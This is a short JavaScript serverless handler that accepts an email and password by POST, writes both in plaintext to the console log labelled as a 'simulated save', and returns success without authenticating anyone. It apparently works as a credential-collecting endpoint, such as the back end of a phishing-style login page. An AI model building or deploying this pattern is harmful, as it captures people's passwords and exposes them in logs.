// api/save.js

export default async function handler(req, res) {
  if (req.method === "POST") {
    const { email, password } = req.body;

    console.log("Login Data (Simulated Save):", { email, password, time: new Date().toISOString() });

    return res.status(200).json({ success: true });
  } else {
    return res.status(405).json({ error: "Only POST method allowed" });
  }
}
